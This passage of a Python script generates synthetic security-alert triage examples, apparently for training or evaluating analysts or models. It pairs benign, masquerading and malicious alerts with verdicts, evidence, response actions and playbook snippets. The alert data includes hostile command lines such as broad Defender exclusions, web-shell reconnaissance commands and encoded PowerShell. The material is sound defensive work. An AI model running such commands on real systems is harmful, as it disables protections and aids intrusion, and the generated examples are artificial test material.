              "Same exclusion added on {} devices within the same hour".format(R.randint(40, 600)))
    a["_app"] = app
    return a, tri("Benign True Positive", "High", "Low",
                  btp_mitre("T1562.001 - Impair Defenses: Disable or Modify Tools"),
                  "The Intune management agent applied a narrow Defender exclusion for an application folder across many devices, a centrally managed policy change.",
                  ["AgentExecutor.exe runs from the Intune Management Extension folder, is Microsoft-signed, and runs as SYSTEM under the Intune agent.",
                   "The exclusion is scoped to one application folder, {}, not a broad staging path.".format(app),
                   "The same change landed on many devices within an hour, consistent with a policy rollout.",
                   "Realtime protection was not disabled."],
                  ["Confirm the exclusion appears in the Intune policy change log.",
                   "Close as Benign True Positive and periodically review Intune exclusions to keep them narrow."])


def defender_fake_intune():  # masquerade
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    fake = pick(["C:\\Users\\Public\\IntuneMgmt\\AgentExecutor.exe",
                 "C:\\Users\\{}\\AppData\\Local\\Microsoft Intune Management Extension\\AgentExecutor.exe".format(u),
                 "C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\AgentExecutor.exe"])
    a = alert("defender", t, host, grp, os_, "CORP\\" + u, fake,
              "AgentExecutor.exe -powershell \"Add-MpPreference -ExclusionPath 'C:\\ProgramData','{}'\"".format("C:\\Users\\" + u + "\\AppData"),
              chain("cmd.exe", "explorer.exe"), "Unsigned", prev(1), "None observed",
              "Exclusion added on this device only; a new executable was written to C:\\ProgramData 20 seconds later")
    return a, tri("True Positive", "High", "High",
                  "T1562.001 - Impair Defenses; T1036.005 - Masquerading: Match Legitimate Name or Location",
                  "An unsigned binary named like the Intune agent added broad Defender exclusions on one device under a user account; this is malware disabling defenses while imitating Intune.",
                  ["The real AgentExecutor.exe is Microsoft-signed under C:\\Program Files (x86)\\Microsoft Intune Management Extension, but this one runs from {}.".format(fake),
                   "It is unsigned, seen on one host, and runs as {} under explorer.exe instead of SYSTEM under the Intune service.".format(u),
                   "The exclusions cover broad user-writable paths, not an application folder.",
                   "The change hit one device only and was followed by a new executable in an excluded folder."],
                  ["Isolate {}.".format(host),
                   "Remove the exclusions and run a full scan that includes the excluded paths.",
                   "Collect the fake AgentExecutor.exe and the dropped executable.",
                   "Hunt for AgentExecutor.exe running outside the Intune Management Extension folder."])


# ================================================================== Web server
def webshell_mal():
    host, grp, os_ = srv_host("web"); t, h = ts("any")
    f = "C:\\inetpub\\wwwroot\\aspnet_client\\{}.aspx".format(rand_name(6))
    cmd = pick(["cmd.exe /c whoami & ipconfig /all", "cmd.exe /c net user /domain",
                "cmd.exe /c powershell -enc " + ps_enc("Get-Process | Out-String")])
    a = alert("webchild", t, host, grp, os_, "IIS APPPOOL\\DefaultAppPool", PATHS["cmd.exe"], cmd,
              chain("w3wp.exe -ap \"DefaultAppPool\"", "svchost.exe -k iissvcs"), "Signed: Microsoft Windows", ALL_HOSTS,
              "Inbound HTTPS POSTs to {} from {}".format(os.path.basename(f), ext_ip()),
              "File {} created 10 minutes earlier; not part of any deployment package".format(f))
    return a, tri("True Positive", "High", "Critical",
                  "T1505.003 - Server Software Component: Web Shell; T1190 - Exploit Public-Facing Application",
                  "An IIS worker process on an internet-facing server is running shell commands after a new .aspx file appeared and received external POSTs, which indicates a web shell.",
                  ["w3wp.exe spawning cmd.exe for reconnaissance commands is a strong web shell indicator.",
                   "A new file {} appeared shortly before, outside any deployment.".format(f),
                   "External POST requests targeted that file.",
                   "{} is internet-facing and exposed to exploitation.".format(host)],
                  ["Isolate {} or pull it from the load balancer.".format(host),
                   "Preserve and then remove the web shell, and collect IIS logs to find source IPs and the entry vulnerability.",
                   "Patch the exploited application and hunt for credential theft or lateral movement from the server.",
                   "Check other web servers for similar new .aspx files."])


def webshell_fp():
    host, grp, os_ = srv_host(pick(["web", "app"])); t, h = ts("any")
    csc = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
    a = alert("webchild", t, host, grp, os_, "IIS APPPOOL\\{}".format(pick(["CustomerPortal", "IntranetApp", "DefaultAppPool"])), csc,
              '"{}" /noconfig /fullpaths @"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Temporary ASP.NET Files\\root\\{}\\{}.cmdline"'.format(csc, rand_name(8), rand_name(8)),
              chain("w3wp.exe", "svchost.exe -k iissvcs"), "Signed: Microsoft Corporation", ALL_HOSTS, "None observed",
              "Application pool recycled 1 minute earlier; no files created in the web root outside the deployment package")
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1505.003 - Server Software Component: Web Shell"),
                  "IIS invoked the .NET C# compiler to compile ASP.NET pages after an app pool recycle, which is standard ASP.NET behavior.",
                  ["csc.exe is the signed .NET compiler, and its Temporary ASP.NET Files response file is the normal dynamic compilation pattern.",
                   "The app pool recycled a minute earlier, which triggers recompilation.",
                   "No command shells, reconnaissance commands, or unexpected new pages were observed."],
                  ["Close as False Positive.",
                   "Exclude csc.exe and cvtres.exe children of w3wp.exe when the arguments reference Temporary ASP.NET Files."])


def sql_cmd():
    host, grp, os_ = srv_host("sql"); t, h = ts(pick(["night_window", "business"]))
    share = "\\\\SRV-FILE{:02d}\\Exports".format(R.randint(1, 12))
    a = alert("svcshell", t, host, grp, os_, "CORP\\svc_sql", PATHS["cmd.exe"],
              "cmd.exe /c copy D:\\Exports\\{}_{}.csv {}\\".format(pick(["orders", "customers", "billing"]), t[:10].replace("-", ""), share),
              chain("sqlservr.exe -sMSSQLSERVER", "services.exe"), "Signed: Microsoft Windows", ALL_HOSTS,
              "SMB to {}".format(share.split("\\")[2]),
              "xp_cmdshell is enabled on this instance; no other child processes of sqlservr.exe in the past 24 hours")
    a["_share"] = share
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1059.003 - Command and Scripting Interpreter: Windows Command Shell; T1505.001 - SQL Stored Procedures",
                  "SQL Server used xp_cmdshell to copy a data export to an internal file share; this may be a scheduled export job or data staging by an attacker with database access.",
                  ["sqlservr.exe spawned cmd.exe through xp_cmdshell, which attackers also abuse after compromising a database.",
                   "The command only copies a CSV export to an internal share, {}, with no external network traffic.".format(share),
                   "The alert cannot show whether a SQL Agent job is scheduled to do this."],
                  ["Check the SQL Agent jobs and change calendar for a scheduled export on {}.".format(host),
                   "Review recent SQL logins to the instance for unusual sources.",
                   "If no job explains it, disable xp_cmdshell and escalate as a potential data-staging incident."])


# ============================================================ Remote access
def rat_mal():
    u = user(); host = "WS-FIN-{:03d}".format(R.randint(1, 250)); t, h = ts(pick(["business", "offhours"]))
    tool = pick([("AnyDesk.exe", "philandro Software GmbH"), ("ScreenConnect.ClientSetup.exe", "ConnectWise, LLC"),
                 ("rustdesk.exe", "Purslane Ltd")])
    dom = bad_domain()
    a = alert("rat", t, host, "Finance Workstations", pick(OS_WS), "CORP\\" + u,
              "C:\\Users\\{}\\Downloads\\{}".format(u, tool[0]), '"C:\\Users\\{}\\Downloads\\{}"'.format(u, tool[0]),
              chain("explorer.exe"), "Signed: " + tool[1], prev(1),
              "Inbound remote session via vendor relay established 40 seconds after launch",
              "File downloaded by msedge.exe from https://{} 2 minutes earlier".format(dom))
    return a, tri("True Positive", "Medium", "High",
                  "T1219 - Remote Access Software; T1566.004 - Phishing: Spearphishing Voice",
                  "A Finance user downloaded and ran {} from a lookalike domain, and an inbound remote session started immediately; this matches help-desk impersonation scams.".format(tool[0]),
                  ["{} is legitimately signed, but it runs from Downloads and is seen on no other host.".format(tool[0]),
                   "It was downloaded from {}, a suspicious-TLD domain rather than the vendor's site.".format(dom),
                   "An inbound remote session started within a minute, so someone outside took control.",
                   "Finance users are the usual target of fake IT-support remote sessions."],
                  ["Isolate {} and terminate the remote session.".format(host),
                   "Call {} on a known number to learn who instructed them to install the tool.".format(u),
                   "Reset {}'s credentials and review payments or data access during the session.".format(u),
                   "Block {} and the tool's relay domains at the proxy.".format(dom)])


def rat_benign():
    host, grp, os_ = srv_host("help"); t, h = ts("business")
    tv = "C:\\Program Files\\TeamViewer\\TeamViewer_Service.exe"
    a = alert("rat", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", tv, '"{}"'.format(tv),
              chain("services.exe"), "Signed: TeamViewer Germany GmbH", prev(55),
              "Connections to TeamViewer routers only",
              "Installed 3 minutes earlier by msiexec.exe launched by C:\\Windows\\CCM\\CcmExec.exe")
    return a, tri("Benign True Positive", "High", "Low",
                  btp_mitre("T1219 - Remote Access Software"),
                  "SCCM installed TeamViewer as a service on an IT Helpdesk workstation, where remote support tools are expected.",
                  ["The install came from the SCCM client in C:\\Windows\\CCM, so it was centrally deployed.",
                   "The service runs from Program Files and is signed by TeamViewer Germany GmbH.",
                   "{} is an IT Helpdesk host, and the tool is present on 55 hosts, consistent with the helpdesk fleet.".format(host),
                   "Connections go only to TeamViewer infrastructure."],
                  ["Confirm TeamViewer is the approved remote support tool for helpdesk hosts.",
                   "Close as Benign True Positive."])


def office_child_fake_splwow():  # masquerade
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    fake = pick(["C:\\Users\\{}\\AppData\\Local\\Temp\\splwow64.exe".format(u), "C:\\Users\\Public\\splwow64.exe",
                 "C:\\ProgramData\\Microsoft\\splwow64.exe"])
    ip = ext_ip()
    parent = pick(["WINWORD.EXE", "EXCEL.EXE"])
    a = alert("officechild", t, host, grp, os_, "CORP\\" + u, fake, fake + " 8192",
              chain(parent, "OUTLOOK.EXE", "explorer.exe"), "Unsigned", prev(1),
              "HTTPS to {}:443 shortly after launch".format(ip),
              "No print job was submitted; the file was created by {} 5 seconds before it ran".format(parent))
    return a, tri("True Positive", "High", "High",
                  "T1204.002 - User Execution: Malicious File; T1036.005 - Masquerading: Match Legitimate Name or Location",
                  "An Office macro dropped and ran a fake splwow64.exe outside C:\\Windows that connects to an external IP; it borrows the print host's name to look harmless.",
                  ["The real splwow64.exe lives only in C:\\Windows, but this one runs from {}.".format(fake),
                   "It is unsigned, seen on one host, and was written by {} seconds before running.".format(parent),
                   "No print job accompanied it, so printing does not explain the launch.",
                   "It connected to raw IP {}, which the print host never does.".format(ip)],
                  ["Isolate {} and terminate the process.".format(host),
                   "Collect the fake splwow64.exe and the Office document that dropped it.",
                   "Block {} and search the fleet for splwow64.exe outside C:\\Windows.".format(ip),
                   "Purge the originating email and reset {}'s credentials.".format(u)])


def teamviewer_user():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    exe = "C:\\Program Files\\TeamViewer\\TeamViewer.exe"
    a = alert("rat", t, host, grp, os_, "CORP\\" + u, exe, '"{}"'.format(exe),
              chain("explorer.exe"), "Signed: TeamViewer Germany GmbH", prev(R.randint(2, 6)),
              "Connections to TeamViewer routers only; no inbound session established",
              "Installed 10 minutes earlier by msiexec.exe started from C:\\Users\\{}\\Downloads\\TeamViewer_Setup_x64.exe".format(u))
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1219 - Remote Access Software",
                  "A user installed the genuine, signed TeamViewer from a download on a {} host; no one has connected yet, but whether the tool is allowed there must be checked.".format(grp),
                  ["TeamViewer.exe is genuinely signed and installed in Program Files, so the binary itself is legitimate.",
                   "The user installed it from their Downloads folder rather than through central deployment.",
                   "{} is a {} host, not an IT support machine.".format(host, grp),
                   "No inbound session has been established yet."],
                  ["Check whether TeamViewer is approved on {} hosts.".format(grp),
                   "Ask {} why they installed it and whether someone asked them to.".format(u),
                   "If it is not approved, uninstall it and block the installer hash."])


def internal_tool_task():
    host, grp, os_ = ws_host(); t, h = ts(pick(["business", "night_window"]))
    exe = "C:\\Program Files\\CorpTools\\{}".format(pick(["AssetAgent.exe", "PrinterMapper.exe", "HardwareInventory.exe"]))
    n = R.randint(1500, 2200)
    a = alert("schtask", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\schtasks.exe",
              'schtasks /create /tn "CorpTools\\{}" /tr "{}" /sc daily /st 09:00 /ru SYSTEM /f'.format(os.path.basename(exe)[:-4], exe),
              chain("powershell.exe", "CcmExec.exe", "services.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Task action binary {}: unsigned, seen on {} hosts; the same task was created on {} hosts this week".format(exe, n, n - R.randint(5, 80)))
    return a, tri("Benign True Positive", "Medium", "Low",
                  btp_mitre("T1053.005 - Scheduled Task/Job: Scheduled Task"),
                  "The SCCM client created a daily task for an in-house CorpTools utility across the fleet; the binary is unsigned, but it is centrally deployed and present on nearly every host.",
                  ["The task was created by PowerShell under C:\\Windows\\CCM\\CcmExec.exe, the SCCM client, running as SYSTEM.",
                   "{} is unsigned, which is common for in-house tools, but it sits in Program Files and is on {} hosts.".format(exe, n),
                   "The same task was created across most of the fleet this week, consistent with a software deployment.",
                   "Unsigned alone is not evidence of malice when deployment, path, and prevalence all fit."],
                  ["Close as Benign True Positive.",
                   "Ask the CorpTools owners to code-sign their binaries so they stop triggering signature-based rules."])


VARIANTS = [lsass_procdump, lsass_comsvcs, lsass_werfault, lsass_fake_werfault,
            ps_encoded_office, ps_encoded_sccm, ps_encoded_fake_sccm, ps_encoded_ambiguous, dev_ps_github,
            certutil_download, certutil_decode, certutil_hashfile,
            office_child_mal, office_child_splwow, office_child_addin,
            schtask_mal, schtask_benign, runkey_mal, runkey_benign, runkey_masq,
            vss_mal, vss_benign, ransom_mal, ransom_benign,
            psexec_mal, psexec_benign, psexec_ambiguous,
            rclone_mal, rclone_benign, rclone_wrong_remote,
            rundll32_mal, rundll32_benign, discovery_mal, discovery_benign,
            defender_mal, defender_benign, defender_fake_intune,
            webshell_mal, webshell_fp, sql_cmd, rat_mal, rat_benign,
            office_child_fake_splwow, teamviewer_user, internal_tool_task]


# ======================================================== retrieved context
# Document names here are the files the RAG corpus will contain.
PLAYBOOKS = {
    "cred": ("playbook_credential_access.md", "PB-CRED-01",
             "Credential Access Response. Applies to LSASS access, credential dumping tools, and Kerberoasting. "
             "1) Contain the host with EDR network isolation. 2) Reset passwords for every account with a session on the host and revoke refresh tokens. "
             "3) If a domain controller or Tier-0 account is involved, page the IR on-call and plan a double krbtgt reset. "
             "4) Preserve dump files as evidence before deletion. SLA: IR lead notified within 30 minutes.",
             "Per PB-CRED-01, notify the IR lead within 30 minutes and revoke refresh tokens for every exposed account."),
    "phish": ("playbook_phishing.md", "PB-PHISH-01",
              "Phishing Payload Execution. 1) Isolate the host. 2) Run a mailbox-wide Search and Purge on the message ID. "
              "3) Submit the attachment to the sandbox. 4) Reset the user's credentials and check inbox rules for auto-forwarding. "
              "SLA: purge completed within 1 hour of confirmation.",
              "Per PB-PHISH-01, complete the mailbox-wide purge within 1 hour and check the user's inbox rules for auto-forwarding."),
    "malexec": ("playbook_malware_execution.md", "PB-MAL-01",
                "Malware Execution and Persistence. 1) Isolate the host. 2) Submit the binary to the sandbox and record its SHA256 in the IOC tracker. "
                "3) Remove persistence (Run keys, scheduled tasks, services). 4) Reimage if the payload ran with SYSTEM or admin rights. SLA: containment within 15 minutes.",
                "Per PB-MAL-01, record the SHA256 in the IOC tracker, and reimage the host if the payload ran with elevated rights."),
    "lateral": ("playbook_lateral_movement.md", "PB-LAT-01",
                "Lateral Movement and Domain Reconnaissance. 1) Isolate the source and all destination hosts. 2) Disable the account used. "
                "3) If a domain controller received remote execution, declare a Severity 1 incident and engage the external IR retainer. "
                "4) Review 7 days of logons for the account.",
                "Per PB-LAT-01, declare a Severity 1 incident and engage the external IR retainer if any domain controller was touched."),
    "ransom": ("playbook_ransomware.md", "PB-RANS-01",
               "Ransomware. 1) Isolate affected servers; the network team may shut down SMB at the core switch. "
               "2) Verify immutable backups in the offsite vault. 3) Do not power off encrypted hosts (preserve memory). "
               "4) Notify the CISO, legal, and the cyber-insurance carrier within 1 hour.",
               "Per PB-RANS-01, keep encrypted hosts powered on to preserve memory, and notify the CISO, legal, and the cyber-insurance carrier within 1 hour."),
    "exfil": ("playbook_exfiltration.md", "PB-EXFIL-01",
              "Data Exfiltration. 1) Block the destination at the egress firewall. 2) Disable the account. "
              "3) Have the data owner classify the affected data. 4) The privacy officer decides on breach notification within 72 hours.",
              "Per PB-EXFIL-01, have the data owner classify the affected data so the privacy officer can make the 72-hour notification decision."),
    "web": ("playbook_web_compromise.md", "PB-WEB-01",
            "Web Server Compromise. 1) Remove the server from the load balancer pool. 2) Snapshot the VM before remediation. "
            "3) Collect IIS logs and the web root. 4) Rotate application secrets and service account credentials.",
            "Per PB-WEB-01, snapshot the VM before remediation and rotate the application's secrets and service account credentials."),
    "evasion": ("playbook_defense_evasion.md", "PB-EVA-01",
                "Defense Evasion. 1) Isolate the host. 2) Force an Intune policy sync to restore Defender settings and remove unauthorized exclusions. "
                "3) Run a full scan including previously excluded paths. 4) Hunt fleet-wide for the same exclusion paths.",
                "Per PB-EVA-01, force an Intune policy sync to restore Defender settings before the full scan."),
    "rat": ("playbook_remote_access.md", "PB-RAT-01",
            "Unauthorized Remote Access Tool. 1) Isolate the host and end the session. 2) Call the user on the directory number, not the number that called them. "
            "3) For Finance users, ask Treasury to freeze payments initiated in the last 24 hours. 4) Block the tool's domains at the proxy.",
            "Per PB-RAT-01, ask Treasury to freeze payments initiated by this user in the last 24 hours."),
}
PLAYBOOK_FOR = {
    "lsass_procdump": "cred", "lsass_comsvcs": "cred", "lsass_fake_werfault": "cred",
    "ps_encoded_office": "phish", "office_child_mal": "phish",
    "ps_encoded_fake_sccm": "malexec", "certutil_download": "malexec", "certutil_decode": "malexec",
    "schtask_mal": "malexec", "runkey_mal": "malexec", "runkey_masq": "malexec", "rundll32_mal": "malexec",
    "psexec_mal": "lateral", "discovery_mal": "lateral", "vss_mal": "ransom", "ransom_mal": "ransom",
    "rclone_mal": "exfil", "rclone_wrong_remote": "exfil", "webshell_mal": "web",
    "defender_mal": "evasion", "defender_fake_intune": "evasion", "rat_mal": "rat",
}

ALLOW = "approved_tools_allowlist.md"
KFP = "known_false_positives.md"
ROSTER = "admin_roster.md"
CAL = "change_calendar.md"

# Entries that confirm a benign verdict, or expose a masquerade.
SUPPORT_DOCS = {
    "ps_encoded_sccm": (ALLOW, "SCCM-01: C:\\Windows\\CCM\\CcmExec.exe (Microsoft-signed, SYSTEM) runs encoded PowerShell for inventory and compliance baselines on all managed endpoints. A CcmExec.exe anywhere else is NOT the SCCM client.",
                        "approved_tools_allowlist.md entry SCCM-01 confirms CcmExec.exe in C:\\Windows\\CCM runs encoded inventory scripts."),
    "ps_encoded_fake_sccm": (ALLOW, "SCCM-01: C:\\Windows\\CCM\\CcmExec.exe (Microsoft-signed, SYSTEM) runs encoded PowerShell for inventory and compliance baselines on all managed endpoints. A CcmExec.exe anywhere else is NOT the SCCM client.",
                             "approved_tools_allowlist.md entry SCCM-01 states that a CcmExec.exe outside C:\\Windows\\CCM is not the SCCM client."),
    "defender_benign": (ALLOW, "INTUNE-03: Intune AgentExecutor.exe (Program Files (x86)\\Microsoft Intune Management Extension) may add Defender exclusions for approved line-of-business folders: Epic Hyperspace, SAP FrontEnd, Revit 2025, QuickBooks.",
                        "approved_tools_allowlist.md entry INTUNE-03 lists this application folder as an approved Defender exclusion."),
    "defender_fake_intune": (ALLOW, "INTUNE-03: Intune AgentExecutor.exe (Program Files (x86)\\Microsoft Intune Management Extension) may add Defender exclusions for approved line-of-business folders only: Epic Hyperspace, SAP FrontEnd, Revit 2025, QuickBooks.",
                             "approved_tools_allowlist.md entry INTUNE-03 allows only the Program Files AgentExecutor.exe and only application-folder exclusions."),
    "psexec_benign": (ALLOW, "ADM-02: PsExec is approved only from JMP-ADM jump servers, by adm- accounts, during an approved change.",
                      "approved_tools_allowlist.md entry ADM-02 approves PsExec from jump servers by admin accounts during approved changes."),
    "rclone_benign": (ALLOW, "BKP-01: rclone in C:\\Program Files\\rclone, run by svc_backup from the Nightly-Offsite-Backup task on SRV-BKP servers, approved ONLY for remote corp-s3:corp-backups-prod (company-owned bucket).",
                      "approved_tools_allowlist.md entry BKP-01 confirms corp-backups-prod is the company-owned destination for this exact job."),
    "rclone_wrong_remote": (ALLOW, "BKP-01: rclone in C:\\Program Files\\rclone, run by svc_backup from the Nightly-Offsite-Backup task on SRV-BKP servers, approved ONLY for remote corp-s3:corp-backups-prod (company-owned bucket). svc_backup is denied interactive logon by policy.",
                            "approved_tools_allowlist.md entry BKP-01 approves only corp-backups-prod as a destination and denies svc_backup interactive logon."),
    "rat_benign": (ALLOW, "RAT-01: TeamViewer Corporate 15, deployed by SCCM, is the only approved remote support tool, on IT Helpdesk hosts only. AnyDesk, ScreenConnect, and RustDesk are prohibited.",
                   "approved_tools_allowlist.md entry RAT-01 approves SCCM-deployed TeamViewer on IT Helpdesk hosts."),
    "rat_mal": (ALLOW, "RAT-01: TeamViewer Corporate 15, deployed by SCCM, is the only approved remote support tool, on IT Helpdesk hosts only. AnyDesk, ScreenConnect, and RustDesk are prohibited.",
                "approved_tools_allowlist.md entry RAT-01 prohibits this tool outright."),
    "discovery_benign": (ALLOW, "HD-04: Helpdesk adm- accounts may run single-account lookups (net user <name> /domain) from WS-IT hosts while working tickets.",
                         "approved_tools_allowlist.md entry HD-04 permits single-account lookups by helpdesk admins from WS-IT hosts."),
    "schtask_benign": (ALLOW, "SW-02: Vendor auto-updaters for Google, Adobe, and Microsoft Edge, and per-user autostart for Teams, OneDrive, and Zoom are approved software behaviors.",
                       "approved_tools_allowlist.md entry SW-02 lists this vendor updater as approved."),
    "runkey_benign": (ALLOW, "SW-02: Vendor auto-updaters for Google, Adobe, and Microsoft Edge, and per-user autostart for Teams, OneDrive, and Zoom are approved software behaviors. All of these binaries are vendor-signed.",
                      "approved_tools_allowlist.md entry SW-02 lists this per-user autostart as approved."),
    "runkey_masq": (ALLOW, "SW-02: Vendor auto-updaters for Google, Adobe, and Microsoft Edge, and per-user autostart for Teams, OneDrive, and Zoom are approved software behaviors. All of these binaries are vendor-signed.",
                    "approved_tools_allowlist.md entry SW-02 notes that the real OneDrive binary is vendor-signed, and this one is not."),
    "lsass_werfault": (KFP, "FP-07: WerFault.exe in System32, launched by the WerSvc service, accessing lsass.exe right after an Application Error event is crash reporting. Close, and notify the server team about the crash.",
                       "known_false_positives.md entry FP-07 describes exactly this crash-reporting pattern."),
    "lsass_fake_werfault": (KFP, "FP-07: WerFault.exe in System32, launched by the WerSvc service, accessing lsass.exe right after an Application Error event is crash reporting. Any other WerFault.exe path is NOT covered by this entry.",
                            "known_false_positives.md entry FP-07 covers only the System32 WerFault.exe launched by WerSvc, so it does not apply here."),
    "certutil_hashfile": (KFP, "FP-03: certutil -hashfile is used by IT to verify installer checksums and is not proxy execution.",
                          "known_false_positives.md entry FP-03 documents certutil -hashfile as routine IT use."),
    "office_child_splwow": (KFP, "FP-05: Office spawning C:\\Windows\\splwow64.exe (printing) or signed COM-automation add-in binaries from Program Files is expected.",
                            "known_false_positives.md entry FP-05 lists splwow64.exe under Office as expected."),
    "office_child_addin": (KFP, "FP-05: Office spawning C:\\Windows\\splwow64.exe (printing) or signed COM-automation add-in binaries from Program Files is expected.",
                           "known_false_positives.md entry FP-05 lists signed add-in binaries launched with /embedding as expected."),
    "vss_benign": (KFP, "FP-09: Backup agents (Veeam, Commvault) run vssadmin list shadows, list writers, or list shadowstorage before each job. Deletion is never part of the normal job.",
                   "known_false_positives.md entry FP-09 documents read-only vssadmin list commands by backup agents."),
    "ransom_benign": (KFP, "FP-11: The Share-Migration robocopy jobs run by svc_migration trigger the mass-file-modification rule until the migration completes in Q3 2026.",
                      "known_false_positives.md entry FP-11 names this migration task as a known trigger for the rule."),
    "rundll32_benign": (KFP, "FP-02: rundll32 calling shell32 Control_RunDLL, printui PrintUIEntry, or SHCreateLocalServerRunDll is normal Windows behavior.",
                        "known_false_positives.md entry FP-02 lists this rundll32 export as normal Windows behavior."),
    "webshell_fp": (KFP, "FP-06: w3wp.exe spawning csc.exe or cvtres.exe with Temporary ASP.NET Files arguments is ASP.NET dynamic compilation.",
                    "known_false_positives.md entry FP-06 describes this exact compilation pattern."),
}

DISTRACTORS = [
    (CAL, "CHG-{n}: Firewall rule cleanup on perimeter firewalls, Saturday 22:00-02:00 UTC, network team."),
    (CAL, "CHG-{n}: SQL Server cumulative update on SRV-SQL0{d}, Sunday 01:00-03:00 UTC, database team."),
    (ROSTER, "adm-kmiller | Kevin Miller | Identity team | Scope: Entra ID and AD group management | Jump server JMP-ADM02"),
    (ROSTER, "adm-snguyen | Sofia Nguyen | Server Operations | Scope: SRV-APP and SRV-FILE servers | Jump server JMP-ADM01"),
    (KFP, "FP-04: OneDrive Known Folder Move enrollment writes thousands of files in the first hour and can trigger the mass-file-modification rule."),
    (ALLOW, "VPN-02: GlobalProtect is the only approved VPN client; consumer VPNs are prohibited."),
    ("playbook_insider_threat.md", "PB-INS-01 Insider Threat. Coordinate with HR and legal before contacting the employee. Preserve mailbox and endpoint data under legal hold."),
]


def distractor():
    doc, text = pick(DISTRACTORS)
    return doc, text.format(n=R.randint(40000, 49999), d=R.randint(1, 9))


def add_playbook(scen, t, docs):
    if scen not in PLAYBOOK_FOR:
        return
    doc, pid, text, action = PLAYBOOKS[PLAYBOOK_FOR[scen]]
    docs.append((doc, pid + " " + text))
    t["actions"].append(action)
    t["sources"].append(doc)


def rag_context(scen, a, t):
    """Return (docs, triage) for a RAG-style example, or None if no context fits."""
    t = json.loads(json.dumps(t))
    docs = []
    acct = a["user"].split("\\")[-1]

    if scen in ("ps_encoded_ambiguous", "psexec_ambiguous"):
        case = pick(["authorized", "offboarded", "absent"])
        if case == "authorized":
            docs.append((ROSTER, "{} | Server Operations | Scope: SRV-APP servers and read-only AD queries | Note: temporarily seated at {} during the office move until 2026-09-30".format(acct, a["host"])))
            t.update(verdict="Benign True Positive", conf="High", sev="Low",
                     mitre=btp_mitre(t["mitre"].split(";")[0].strip()),
                     summary="The admin roster shows {} is a Server Operations admin temporarily seated at {}, so this in-scope admin activity is authorized.".format(acct, a["host"]))
            t["evidence"].append("admin_roster.md shows {} is in Server Operations and temporarily seated at {}.".format(acct, a["host"]))
            t["actions"] = ["Close as Benign True Positive.",
                            "Remind {} that admin tasks should run from a jump server and that encoding or ad-hoc tool downloads trigger alerts.".format(acct)]
        elif case == "offboarded":
            docs.append((ROSTER, "{} | DISABLED - owner offboarded on 2026-01-31; this account must show no activity".format(acct)))
            t.update(verdict="True Positive", conf="High", sev="Critical",
                     mitre=t["mitre"] + "; T1078.002 - Valid Accounts: Domain Accounts",
                     summary="{} belongs to an offboarded employee and should be disabled, yet it is running admin activity from {}; the account is being misused.".format(acct, a["host"]))
            t["evidence"].append("admin_roster.md marks {} as belonging to an employee offboarded on 2026-01-31, so any activity is unauthorized.".format(acct))
            t["actions"] = ["Disable {} immediately and reset its password.".format(acct),
                            "Isolate {} and identify who is using the account.".format(a["host"]),
                            "Review every logon by {} since 2026-01-31.".format(acct)]
            add_playbook("psexec_mal", t, docs)
        else:
            docs.append(distractor())
            docs.append((ROSTER, "adm-jreyes | John Reyes | Server Operations | Scope: SRV-APP servers | Jump server JMP-ADM01"))
            t["evidence"].append("admin_roster.md has no entry for {}, so its scope cannot be confirmed.".format(acct))
            t["actions"][0] = "Ask the identity team why {} is missing from admin_roster.md, and confirm the activity with its owner.".format(acct)
        t["sources"].append(ROSTER)

    elif scen == "dev_ps_github":
        docs.append((ALLOW, "DEV-05: Engineering may run bootstrap scripts only from the github.com/corp-eng organization. Scripts from personal or third-party repositories require a security review first."))
        if a["_org"] == "corp-eng":
            t.update(verdict="Benign True Positive", conf="High", sev="Low",
                     mitre=btp_mitre("T1059.001 - Command and Scripting Interpreter: PowerShell"),
                     summary="A developer ran a bootstrap script from the approved corp-eng GitHub organization, which the allowlist permits.")
            t["evidence"].append("approved_tools_allowlist.md entry DEV-05 approves bootstrap scripts from github.com/corp-eng.")
            t["actions"] = ["Close as Benign True Positive.",
                            "Tune the rule to allow raw.githubusercontent.com/corp-eng scripts launched from VS Code on Engineering hosts."]
        else:
            t.update(sev="High", summary="A developer executed a remote script from '{}', which is not the approved corp-eng organization; this violates DEV-05, and the script must be reviewed before the host is trusted.".format(a["_org"]))
            t["evidence"].append("approved_tools_allowlist.md entry DEV-05 allows only github.com/corp-eng, so this source is unapproved.")
            t["actions"].insert(0, "Isolate {} until the script from github.com/{} has been reviewed.".format(a["host"], a["_org"]))
        t["sources"].append(ALLOW)

    elif scen == "sql_cmd":
        if R.random() < 0.5:
            docs.append((CAL, "JOB-SQL-EXPORT: Nightly xp_cmdshell copy of order, customer, and billing CSV exports from {} to {} at 01:00-03:00 UTC. Owner: database team.".format(a["host"], a["_share"])))
            if is_offhours(int(a["time"][11:13])):
                t.update(verdict="Benign True Positive", conf="High", sev="Low",
                         mitre=btp_mitre("T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),
                         summary="This is the documented nightly export job: same server, same share, inside its scheduled window.")
                t["evidence"].append("change_calendar.md entry JOB-SQL-EXPORT documents this exact copy from {} to {} in this time window.".format(a["host"], a["_share"]))
                t["actions"] = ["Close as Benign True Positive.",
                                "Suppress this rule for the export job's command line during its 01:00-03:00 UTC window."]
            else:
                t.update(sev="High", summary="The copy matches the nightly export job's server and share, but it ran during business hours, outside the job's 01:00-03:00 UTC window.")
                t["evidence"].append("change_calendar.md entry JOB-SQL-EXPORT schedules this copy only between 01:00 and 03:00 UTC, so this run is off-schedule.")
                t["actions"].insert(0, "Ask the database team whether someone ran the export manually today.")
        else:
            docs.append((CAL, "JOB-SQL-REINDEX: Weekly index maintenance on SRV-SQL0{}, Sunday 02:00-04:00 UTC. Owner: database team.".format(R.randint(1, 9))))
            t["evidence"].append("change_calendar.md lists no scheduled export job for {}.".format(a["host"]))
        t["sources"].append(CAL)

    elif scen == "teamviewer_user":
        doc, text, _ = SUPPORT_DOCS["rat_mal"]
        docs.append((doc, text))
